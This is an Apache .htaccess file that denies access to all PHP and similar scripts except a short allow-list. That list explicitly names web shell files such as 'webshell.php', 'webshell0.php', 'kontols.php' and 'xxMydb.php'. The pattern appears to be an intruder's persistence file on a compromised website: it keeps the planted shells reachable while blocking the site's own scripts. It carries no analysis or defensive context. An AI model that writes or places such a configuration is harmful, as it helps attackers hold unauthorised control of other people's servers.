<FilesMatch (\.ph$|\.php$|\.phtml$|\.shtml$|\.$|^public_html$)>
    Order Allow,Deny
    Deny from all
</FilesMatch>

<FilesMatch "^(webshell0.php|webshell.php|xxMydb.php|themes.php|config.php|template.php|xxMydb.php|config.inc.php|index.php|myfk.php|kontols.php|admin.php|wp-login.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>

